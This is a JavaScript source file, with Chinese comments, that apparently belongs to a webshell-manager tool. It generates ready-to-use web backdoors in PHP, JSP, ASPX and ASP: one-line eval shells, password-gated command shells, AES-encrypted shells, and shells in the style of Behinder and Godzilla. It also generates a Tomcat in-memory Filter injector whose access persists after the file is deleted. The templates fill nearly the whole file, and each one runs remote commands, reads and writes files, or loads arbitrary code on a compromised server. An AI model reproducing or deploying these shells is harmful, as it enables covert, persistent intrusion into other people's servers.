// dsh-webshell-mgr 生成器：产出基础马与自研加密马（php/jsp/aspx）。
//   - oneliner：PHP 一句话（eval 通道，蚁剑默认马同形）
//   - basic-system：口令门 + 命令参数马（cmd-system 通道）
//   - dsh-aes：自研加密马 v1（c/u/d）/ v2（+e eval）——协议与 lib/protocol/dsh-aes.js 逐字段对齐
// 免杀变体不在生成器职责内（免杀对抗模式自产）；本生成器面向「快速起一个能用的马」。
// 产物落 ~/.dsh/webshell-mgr/generated/，由 store.generations 登记。

import { mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { randomBytes, createHash } from "node:crypto";

const md5Hex = (s) => createHash("md5").update(Buffer.from(s, "utf8")).digest("hex");

export const GEN_DIR = (base) => join(base, "generated");

export const GEN_KINDS = {
	"php-oneliner": { label: "PHP 一句话（eval 通道）", ext: "php", lang: "php" },
	"php-basic": { label: "PHP 基础马（口令门+命令通道）", ext: "php", lang: "php" },
	"php-aes1": { label: "PHP 自研加密马 v1（c/u/d）", ext: "php", lang: "php" },
	"php-aes2": { label: "PHP 自研加密马 v2（+e eval）", ext: "php", lang: "php" },
	"php-behinder": { label: "PHP 冰蝎型马（AES-ECB 形态）", ext: "php", lang: "php" },
	"php-godzilla": { label: "PHP 哥斯拉型马（XOR_BASE64 形态）", ext: "php", lang: "php" },
	"jsp-basic": { label: "JSP 基础马（口令门+命令通道）", ext: "jsp", lang: "jsp" },
	"jsp-aes1": { label: "JSP 自研加密马 v1（c/u/d）", ext: "jsp", lang: "jsp" },
	"jsp-behinder": { label: "JSP 冰蝎型马（AES-ECB·编译载荷通道）", ext: "jsp", lang: "jsp" },
	"jsp-godzilla": { label: "JSP 哥斯拉型马（JAVA_AES_BASE64·会话态 dispatcher）", ext: "jsp", lang: "jsp" },
	"jsp-mem-filter": { label: "JSP 内存马引导器（Filter 型·AES-ECB·访问即注入）", ext: "jsp", lang: "jsp" },
	"aspx-basic": { label: "ASPX 基础马（口令门+命令通道）", ext: "aspx", lang: "aspx" },
	"aspx-behinder": { label: "ASPX 冰蝎型马（AES-ECB·程序集载荷通道）", ext: "aspx", lang: "aspx" },
	"aspx-godzilla": { label: "ASPX 哥斯拉型马（CSHAP_AES_BASE64·会话态 dispatcher）", ext: "aspx", lang: "aspx" },
	"asp-basic": { label: "ASP 经典马（口令门+命令通道·WScript.Shell）", ext: "asp", lang: "asp" },
	"aspx-aes1": { label: "ASPX 自研加密马 v1（c/u/d）", ext: "aspx", lang: "aspx" }
};

const randPass = () => randomBytes(6).toString("hex");

//#region 模板

function tplPhpOneliner(passParam) {
	return `<?php @eval($_POST['${passParam}']); ?>\n`;
}

function tplPhpBasic(passParam, cmdParam, password) {
	return `<?php
if (isset($_POST['${passParam}']) && hash_equals('${password}', $_POST['${passParam}']) && isset($_POST['${cmdParam}'])) {
    $r = false;
    if (function_exists('shell_exec')) { $r = @shell_exec($_POST['${cmdParam}'] . ' 2>&1'); }
    elseif (function_exists('system')) { ob_start(); @system($_POST['${cmdParam}'] . ' 2>&1'); $r = ob_get_clean(); }
    elseif (function_exists('exec')) { $x = array(); @exec($_POST['${cmdParam}'] . ' 2>&1', $x); $r = implode("\\n", $x); }
    echo $r === false || $r === null ? '' : $r;
}
`;
}

const PHP_AES_HEAD = `<?php
$t = isset($_SERVER['HTTP_X_T']) ? $_SERVER['HTTP_X_T'] : '';
$m = base64_decode($t, true);
if ($m === false || strlen($m) !== 32) { http_response_code(404); exit; }
$iv = substr($m, 0, 16);
$k  = substr($m, 16, 16);
$pt = openssl_decrypt(base64_decode(file_get_contents('php://input'), true), 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $iv);
if ($pt === false || $pt === '') { http_response_code(500); exit; }
$op = $pt[0];
$a  = substr($pt, 1);
header('Content-Type: application/json; charset=utf-8');
function wsm_ok($d) { echo json_encode(array('code' => 0, 'data' => base64_encode($d))); exit; }
`;

const PHP_AES_CMD = `switch ($op) {
case 'c':
    $r = '';
    if (function_exists('shell_exec')) { $r = @shell_exec($a); }
    elseif (function_exists('system')) { ob_start(); @system($a); $r = ob_get_clean(); }
    elseif (function_exists('exec')) { $x = array(); @exec($a . ' 2>&1', $x); $r = implode("\\n", $x); }
    wsm_ok($r === false || $r === null ? '' : (string)$r);
case 'u':
    $p = explode('|', $a, 3);
    if (count($p) !== 3) { http_response_code(404); exit; }
    $d = base64_decode($p[2], true);
    wsm_ok(@file_put_contents($p[1], $d) === false ? 'err' : 'ok');
case 'd':
    $c = @file_get_contents($a);
    wsm_ok($c === false ? '' : $c);
`;

const PHP_AES_EVAL = `case 'e':
    ob_start();
    try { eval($a); } catch (Throwable $e) {}
    $o = ob_get_clean();
    wsm_ok($o === false ? '' : (string)$o);
`;

const PHP_AES_TAIL = `default:
    http_response_code(404); exit;
}
`;

function tplPhpAes(withEval) {
	return PHP_AES_HEAD + PHP_AES_CMD + (withEval ? PHP_AES_EVAL : "") + PHP_AES_TAIL;
}

function tplJspBasic(passParam, cmdParam, password) {
	return `<%@ page import="java.io.*,java.util.*" %>
<%
String pw = request.getParameter("${passParam}");
String c = request.getParameter("${cmdParam}");
if ("${password}".equals(pw) && c != null) {
    try {
        String os = System.getProperty("os.name").toLowerCase();
        ProcessBuilder pb = os.contains("win")
            ? new ProcessBuilder("cmd.exe", "/c", c)
            : new ProcessBuilder("/bin/sh", "-c", c);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line; StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) { sb.append(line).append('\\n'); }
        p.waitFor();
        out.println(sb.toString());
    } catch (Exception e) { out.println("err: " + e.getMessage()); }
}
%>
`;
}

function tplJspBehinder(password) {
	const key = md5Hex(password).slice(0, 16);
	return `<%@ page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.*,java.io.*" %>
<%!
class WsmLoader extends ClassLoader {
    WsmLoader(ClassLoader parent) { super(parent); }
    public Class define(byte[] b) { return super.defineClass(b, 0, b.length); }
}
%>
<%
if ("POST".equals(request.getMethod())) {
    Cipher ci = Cipher.getInstance("AES/ECB/PKCS5Padding");
    ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec("${key}".getBytes(), "AES"));
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    InputStream in = request.getInputStream();
    byte[] buf = new byte[4096];
    int n;
    while ((n = in.read(buf)) != -1) { bos.write(buf, 0, n); }
    byte[] cls = ci.doFinal(Base64.getMimeDecoder().decode(bos.toByteArray()));
    out.clear();
    out = pageContext.pushBody();
    new WsmLoader(this.getClass().getClassLoader()).define(cls).newInstance().equals(pageContext);
}
%>
`;
}

function tplJspGodzilla(password, secretKey) {
	const key = md5Hex(secretKey).slice(0, 16);
	const pass = password;
	return `<%@ page import="java.util.*,java.io.*,java.net.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
class Gx extends ClassLoader {
    Gx(ClassLoader p) { super(p); }
    public Class def(byte[] b) { return super.defineClass(b, 0, b.length); }
}
static String m5(String s) throws Exception {
    byte[] d = java.security.MessageDigest.getInstance("MD5").digest(s.getBytes("UTF-8"));
    StringBuilder sb = new StringBuilder();
    for (byte x : d) sb.append(String.format("%02X", x));
    return sb.toString();
}
static byte[] aes(byte[] s, boolean enc, String k) throws Exception {
    Cipher c = Cipher.getInstance("AES");
    c.init(enc ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE, new SecretKeySpec(k.getBytes("UTF-8"), "AES"));
    return c.doFinal(s);
}
%>
<%
try {
    String line = request.getReader().readLine();
    String v = line.substring(line.indexOf('=') + 1);
    byte[] data = aes(Base64.getMimeDecoder().decode(URLDecoder.decode(v, "UTF-8")), false, "${key}");
    if (session.getAttribute("payload") == null) {
        session.setAttribute("payload", new Gx(this.getClass().getClassLoader()).def(data));
    } else {
        request.setAttribute("parameters", data);
        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
        Object f = ((Class) session.getAttribute("payload")).newInstance();
        f.equals(arrOut); f.equals(request); f.equals(pageContext);
        String md5 = m5("${pass}" + "${key}");
        response.getWriter().write(md5.substring(0, 16));
        f.toString();
        response.getWriter().write(Base64.getEncoder().encodeToString(aes(arrOut.toByteArray(), true, "${key}")));
        response.getWriter().write(md5.substring(16));
    }
} catch (Exception e) {}
%>
`;
}

function tplJspMemFilter(password) {
	const key = md5Hex(password).slice(0, 16);
	// 引导器：JSP 内声明冰蝎协议 Filter，访问本页一次即注册进 StandardContext；
	// 门控 = POST + X-T 头（无门控头直接放行且不读 body——业务 POST 不被吞请求体），
	// 此后删除本文件连接仍在（URL 填任意存活路径，behinder-java 通道自动带 X-T 标记头）。
	return `<%@ page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.*,java.io.*,org.apache.catalina.core.StandardContext,org.apache.catalina.core.ApplicationFilterConfig,org.apache.catalina.Context,org.apache.tomcat.util.descriptor.web.FilterDef,org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%!
class WsmLoader extends ClassLoader {
    WsmLoader(ClassLoader parent) { super(parent); }
    public Class define(byte[] b) { return super.defineClass(b, 0, b.length); }
}
class WsmMemFilter implements javax.servlet.Filter {
    public void init(javax.servlet.FilterConfig fc) {}
    public void destroy() {}
    public void doFilter(javax.servlet.ServletRequest req, javax.servlet.ServletResponse res, javax.servlet.FilterChain chain)
            throws java.io.IOException, javax.servlet.ServletException {
        javax.servlet.http.HttpServletRequest hr;
        try { hr = (javax.servlet.http.HttpServletRequest) req; } catch (Throwable t) { chain.doFilter(req, res); return; }
        if (!"POST".equals(hr.getMethod()) || hr.getHeader("X-T") == null) { chain.doFilter(req, res); return; }
        try {
            Cipher ci = Cipher.getInstance("AES/ECB/PKCS5Padding");
            ci.init(Cipher.DECRYPT_MODE, new SecretKeySpec("${key}".getBytes(), "AES"));
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            InputStream in = req.getInputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) != -1) { bos.write(buf, 0, n); }
            byte[] cls = ci.doFinal(Base64.getMimeDecoder().decode(bos.toByteArray()));
            new WsmLoader(getClass().getClassLoader()).define(cls).newInstance().equals(new Object[]{ req, res });
        } catch (Throwable ignored) {
            // 解密失败（X-T 探测流量）：直接返回空响应——不再放行（body 已被读取）
            res.setContentType("text/plain");
        }
    }
}
%>
<%
// application 是 ApplicationContextFacade（连 getContext() 都不公开）——私有字段两层解包：
// facade.context → ApplicationContext；.context → StandardContext
Object appCtx = application.getClass().getDeclaredField("context");
((java.lang.reflect.Field) appCtx).setAccessible(true);
appCtx = ((java.lang.reflect.Field) appCtx).get(application);
Object sc0 = appCtx.getClass().getDeclaredField("context");
((java.lang.reflect.Field) sc0).setAccessible(true);
StandardContext sc = (StandardContext) ((java.lang.reflect.Field) sc0).get(appCtx);
String name = "x-" + Long.toHexString(System.nanoTime() & 0xFFFFFFFFL);
FilterDef def = new FilterDef();
def.setFilterName(name);
def.setFilterClass(WsmMemFilter.class.getName());
def.setFilter(new WsmMemFilter());
sc.addFilterDef(def);
FilterMap map = new FilterMap();
map.setFilterName(name);
map.addURLPattern("/*");
map.setDispatcher("REQUEST");
sc.addFilterMap(map);
java.lang.reflect.Field fcfg = StandardContext.class.getDeclaredField("filterConfigs");
fcfg.setAccessible(true);
java.util.Map cfgs = (java.util.Map) fcfg.get(sc);
java.lang.reflect.Constructor ctor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
ctor.setAccessible(true);
cfgs.put(name, ctor.newInstance(sc, def));
application.setAttribute("x-n", name); // 卸载载荷回读（WsmMemUnload 空名时定位）
out.println("MEMSHELL-OK " + name);
%>
`;
}

function tplAspxBehinder(password) {
	const key = md5Hex(password).slice(0, 16);
	// 契约：raw AES 密文体 → Rijndael ECB 解密 → Assembly.Load → CreateInstance("U") → Equals(Page)
	return `<%@ Page Language="C#" %>
<%
try {
    byte[] c = Request.BinaryRead(Request.ContentLength);
    byte[] k = System.Text.Encoding.UTF8.GetBytes("${key}");
    System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged();
    aes.Mode = System.Security.Cryptography.CipherMode.ECB;
    aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
    aes.Key = k;
    byte[] dec = aes.CreateDecryptor().TransformFinalBlock(c, 0, c.Length);
    object pay = System.Reflection.Assembly.Load(dec).CreateInstance("U");
    pay.Equals(this);
} catch {}
%>
`;
}

function tplAspxGodzilla(password, secretKey) {
	const key = md5Hex(secretKey).slice(0, 16);
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
static string M5(string s) {
    byte[] d = System.Security.Cryptography.MD5.Create().ComputeHash(System.Text.Encoding.UTF8.GetBytes(s));
    System.Text.StringBuilder sb = new System.Text.StringBuilder();
    foreach (byte x in d) sb.Append(x.ToString("X2"));
    return sb.ToString();
}
static byte[] Aes(byte[] d, bool encrypt, byte[] key) {
    System.Security.Cryptography.RijndaelManaged a = new System.Security.Cryptography.RijndaelManaged();
    a.Mode = System.Security.Cryptography.CipherMode.CBC;
    a.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
    a.Key = key; a.IV = key;
    return (encrypt ? (System.Security.Cryptography.ICryptoTransform)a.CreateEncryptor() : (System.Security.Cryptography.ICryptoTransform)a.CreateDecryptor())
        .TransformFinalBlock(d, 0, d.Length);
}
</script>
<%
try {
    string v = Request.Form["${password}"] ?? "";
    byte[] keyB = System.Text.Encoding.UTF8.GetBytes("${key}");
    byte[] data = Aes(Convert.FromBase64String(v), false, keyB);
    string md5 = M5("${password}" + "${key}");
    if (Session["payload"] == null) {
        Session["payload"] = Assembly.Load(data);
    } else {
        System.IO.MemoryStream outMs = new System.IO.MemoryStream();
        object f = ((Assembly)Session["payload"]).CreateInstance("UG");
        f.Equals(data);
        f.Equals(outMs);
        Response.Write(md5.Substring(0, 16));
        f.ToString();
        Response.Write(Convert.ToBase64String(Aes(outMs.ToArray(), true, keyB)));
        Response.Write(md5.Substring(16));
    }
} catch {}
%>
`;
}

function tplAspBasic(passParam, cmdParam, password) {
	return `<%
Dim p, c
p = Request.Form("${passParam}")
c = Request.Form("${cmdParam}")
If p = "${password}" And c <> "" Then
    Dim sh, tmp, fso
    Set sh = Server.CreateObject("WScript.Shell")
    tmp = Server.MapPath(".") & "\\x" & Int(Rnd * 99999999) & ".tmp"
    sh.Run "cmd /c " & c & " > \"\"\"" & tmp & "\"\"\" 2>&1", 0, True
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(tmp) Then
        Dim f
        Set f = fso.OpenTextFile(tmp, 1)
        Response.BinaryWrite(f.ReadAll)
        f.Close
        fso.DeleteFile tmp
    End If
End If
%>
`;
}

function tplJspAes() {
	return `<%@ page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,javax.crypto.spec.IvParameterSpec,java.util.*,java.io.*,java.nio.file.*,java.nio.charset.StandardCharsets" %>
<%
String t = request.getHeader("X-T");
byte[] m = null;
try { if (t != null) m = Base64.getDecoder().decode(t); } catch (Exception e) {}
if (m == null || m.length != 32) { response.setStatus(404); return; }
byte[] iv = Arrays.copyOfRange(m, 0, 16);
byte[] key = Arrays.copyOfRange(m, 16, 32);
java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
java.io.InputStream is = request.getInputStream();
byte[] buf = new byte[8192];
int nread;
while ((nread = is.read(buf)) > 0) { bos.write(buf, 0, nread); }
byte[] body = bos.toByteArray();
byte[] ct;
try { ct = Base64.getDecoder().decode(body); } catch (Exception e) { response.setStatus(500); return; }
byte[] pt;
try {
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
    pt = cipher.doFinal(ct);
} catch (Exception e) { response.setStatus(500); return; }
String op = new String(pt, 0, 1, StandardCharsets.UTF_8);
String arg = new String(pt, 1, pt.length - 1, StandardCharsets.UTF_8);
response.setContentType("application/json; charset=utf-8");
if (op.equals("c")) {
    String os = System.getProperty("os.name").toLowerCase();
    StringBuilder sb = new StringBuilder();
    try {
        ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd.exe", "/c", arg) : new ProcessBuilder("/bin/sh", "-c", arg);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) { sb.append(line).append('\\n'); }
        p.waitFor();
    } catch (Exception e) { sb.append("err: ").append(e.getMessage()); }
    out.println("{\\"code\\":0,\\"data\\":\\"" + Base64.getEncoder().encodeToString(sb.toString().getBytes(StandardCharsets.UTF_8)) + "\\"}");
} else if (op.equals("u")) {
    String[] parts = arg.split("\\\\|", 3);
    String res = "err";
    if (parts.length == 3) {
        try { Files.write(Paths.get(parts[1]), Base64.getDecoder().decode(parts[2])); res = "ok"; } catch (Exception e) {}
    }
    out.println("{\\"code\\":0,\\"data\\":\\"" + Base64.getEncoder().encodeToString(res.getBytes(StandardCharsets.UTF_8)) + "\\"}");
} else if (op.equals("d")) {
    byte[] data = new byte[0];
    try { data = Files.readAllBytes(Paths.get(arg)); } catch (Exception e) {}
    out.println("{\\"code\\":0,\\"data\\":\\"" + Base64.getEncoder().encodeToString(data) + "\\"}");
} else {
    response.setStatus(404);
}
%>
`;
}

/** 冰蝎形态马：key=md5(密码)[0:16]，请求体=b64(AES-128-ECB)，eval 载荷（桥接通道目标）。 */
function tplPhpBehinder(password) {
	return `<?php
@error_reporting(0);
$k = '${md5Hex(password).slice(0, 16)}';
$d = @openssl_decrypt(base64_decode(file_get_contents('php://input')), 'AES-128-ECB', $k, OPENSSL_RAW_DATA);
if ($d !== false) { @eval($d); }
`;
}

/** 哥斯拉形态马：password=POST 字段名，key=md5(密钥源)[0:16]；session 载荷注册 + md5 定位符回传。 */
function tplPhpGodzilla(passParam, secretKey) {
	return `<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function wsm_enc($D, $K){
    for ($i = 0; $i < strlen($D); $i++) { $D[$i] = $D[$i] ^ $K[($i + 1) & 15]; }
    return $D;
}
$pass = '${passParam}';
$key = '${md5Hex(secretKey).slice(0, 16)}';
if (isset($_POST[$pass])) {
    $data = wsm_enc(base64_decode($_POST[$pass]), $key);
    if (isset($_SESSION['w'])) {
        $payload = wsm_enc($_SESSION['w'], $key);
        if (strpos($payload, 'getBasicsInfo') === false) { $payload = wsm_enc($payload, $key); }
        eval($payload);
        echo substr(md5($pass . $key), 0, 16);
        echo base64_encode(wsm_enc(@run($data), $key));
        echo substr(md5($pass . $key), 16);
    } else {
        if (strpos($data, 'getBasicsInfo') !== false) {
            $_SESSION['w'] = wsm_enc($data, $key);
        }
    }
}
`;
}

function tplAspxBasic(passParam, cmdParam, password) {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load() {
    if (Request.Form["${passParam}"] != "${password}" || Request.Form["${cmdParam}"] == null) return;
    string c = Request.Form["${cmdParam}"];
    try {
        var psi = new ProcessStartInfo("cmd.exe", "/c " + c) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        if (!Environment.OSVersion.ToString().Contains("Windows"))
            psi = new ProcessStartInfo("/bin/sh", "-c \\"" + c.Replace("\\"", "\\\\\\"") + "\\"") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        using (var p = Process.Start(psi)) {
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit(20000);
        }
    } catch (Exception e) { Response.Write("err: " + e.Message); }
}
</script>
`;
}

function tplAspxAes() {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
static string J(byte[] d) { return "{\\"code\\":0,\\"data\\":\\"" + Convert.ToBase64String(d) + "\\"}"; }
void Page_Load() {
    string t = Request.Headers["X-T"] ?? "";
    byte[] m;
    try { m = Convert.FromBase64String(t); } catch { Response.StatusCode = 404; return; }
    if (m.Length != 32) { Response.StatusCode = 404; return; }
    byte[] iv = new byte[16], key = new byte[16];
    Array.Copy(m, 0, iv, 0, 16); Array.Copy(m, 16, key, 0, 16);
    string bodyStr; using (var sr = new StreamReader(Request.InputStream, Encoding.ASCII)) { bodyStr = sr.ReadToEnd(); }
    byte[] ct;
    try { ct = Convert.FromBase64String(bodyStr.Trim()); } catch { Response.StatusCode = 500; return; }
    byte[] pt;
    try {
        using (var aes = Aes.Create()) {
            aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; aes.Key = key; aes.IV = iv;
            using (var dec = aes.CreateDecryptor()) pt = dec.TransformFinalBlock(ct, 0, ct.Length);
        }
    } catch { Response.StatusCode = 500; return; }
    string op = Encoding.UTF8.GetString(pt, 0, 1);
    string arg = Encoding.UTF8.GetString(pt, 1, pt.Length - 1);
    Response.ContentType = "application/json";
    if (op == "c") {
        var sb = new StringBuilder();
        try {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + arg) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            if (!Environment.OSVersion.ToString().Contains("Windows"))
            psi = new ProcessStartInfo("/bin/sh", "-c \\"" + arg.Replace("\\"", "\\\\\\"") + "\\"") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            using (var p = Process.Start(psi)) { sb.Append(p.StandardOutput.ReadToEnd()); sb.Append(p.StandardError.ReadToEnd()); p.WaitForExit(20000); }
        } catch (Exception e) { sb.Append("err: ").Append(e.Message); }
        Response.Write(J(Encoding.UTF8.GetBytes(sb.ToString())));
    } else if (op == "u") {
        var parts = arg.Split(new[] { '|' }, 3);
        byte[] res = Encoding.UTF8.GetBytes("err");
        if (parts.Length == 3) { try { File.WriteAllBytes(parts[1], Convert.FromBase64String(parts[2])); res = Encoding.UTF8.GetBytes("ok"); } catch { } }
        Response.Write(J(res));
    } else if (op == "d") {
        byte[] data = new byte[0];
        try { data = File.ReadAllBytes(arg); } catch { }
        Response.Write(J(data));
    } else {
        Response.StatusCode = 404;
    }
}
</script>
`;
}

//#endregion

/**
 * 生成一个马。
 * @returns {{ name, kind, lang, filePath, content, hint }}
 */
export function generate(kind, opts = {}) {
	const meta = GEN_KINDS[kind];
	if (!meta) throw new Error(`未知生成类型 ${kind}（可选：${Object.keys(GEN_KINDS).join(" / ")}）`);
	const passParam = String(opts.passParam ?? "pass") || "pass";
	const cmdParam = String(opts.cmdParam ?? "cmd") || "cmd";
	const password = String(opts.password ?? "") || randPass();
	let content;
	switch (kind) {
		case "php-oneliner": content = tplPhpOneliner(passParam); break;
		case "php-basic": content = tplPhpBasic(passParam, cmdParam, password); break;
		case "php-aes1": content = tplPhpAes(false); break;
		case "php-aes2": content = tplPhpAes(true); break;
		case "php-behinder": content = tplPhpBehinder(password); break;
		case "php-godzilla": content = tplPhpGodzilla(passParam, String(opts.secretKey ?? "") || password); break;
		case "jsp-basic": content = tplJspBasic(passParam, cmdParam, password); break;
		case "jsp-aes1": content = tplJspAes(); break;
		case "jsp-behinder": content = tplJspBehinder(password); break;
		case "jsp-godzilla": content = tplJspGodzilla(passParam, String(opts.secretKey ?? "") || password); break;
		case "jsp-mem-filter": content = tplJspMemFilter(password); break;
		case "aspx-basic": content = tplAspxBasic(passParam, cmdParam, password); break;
		case "aspx-behinder": content = tplAspxBehinder(password); break;
		case "aspx-godzilla": content = tplAspxGodzilla(passParam, String(opts.secretKey ?? "") || password); break;
		case "asp-basic": content = tplAspBasic(passParam, cmdParam, password); break;
		case "aspx-aes1": content = tplAspxAes(); break;
		default: throw new Error("unreachable");
	}
	const name = String(opts.name ?? "").trim() || `${kind}-${Date.now().toString(36)}`;
	return { name, kind, lang: meta.lang, ext: meta.ext, content, password, passParam, cmdParam };
}

/** 生成并落盘（baseDir = 插件数据目录）。 */
export function makeAndSave(baseDir, kind, opts = {}) {
	const item = generate(kind, opts);
	const dir = GEN_DIR(baseDir);
	mkdirSync(dir, { recursive: true });
	const safe = item.name.replace(/[^\w.-]+/g, "_");
	const filePath = join(dir, `${safe}.${item.ext}`);
	writeFileSync(filePath, item.content, "utf8");
	const connHint = item.kind.endsWith("-oneliner")
		? `连接：协议=cmd-eval，POST 参数名=${item.passParam}，URL=<马地址>`
		: item.kind.endsWith("-basic")
			? `连接：协议=cmd-system，口令参数=${item.passParam}，口令=${item.password}，命令参数=${item.cmdParam}`
			: item.kind === "php-behinder"
				? `连接：协议=behinder，口令=${item.password}（key=md5(口令)[0:16] 自动派生）`
				: item.kind === "php-godzilla"
					? `连接：协议=godzilla，password=POST 参数名（${item.passParam}），密钥源=${String(opts.secretKey ?? "") || item.password}`
					: `连接：协议=dsh-aes（无需口令——密钥每请求随机）；${item.kind === "php-aes2" ? "v2 含 eval 能力（结构化文件/数据库操作可用）" : "v1 仅命令+二进制读写"}`;
	return { ...item, filePath, connHint };
}

/** 从既有文件导入（免杀模式产物 / 存量马登记）。 */
export function importFromFile(baseDir, srcPath, opts = {}) {
	const content = readFileSync(srcPath, "utf8");
	const name = String(opts.name ?? "").trim() || (srcPath.split("/").pop() ?? "imported");
	const ext = (name.includes(".") ? name.split(".").pop() : "php") ?? "php";
	const dir = GEN_DIR(baseDir);
	mkdirSync(dir, { recursive: true });
	const safe = name.replace(/[^\w.-]+/g, "_");
	const filePath = join(dir, safe);
	writeFileSync(filePath, content, "utf8");
	return { name, kind: "import", lang: ext === "jsp" ? "jsp" : ext === "aspx" ? "aspx" : "php", filePath, content };
}
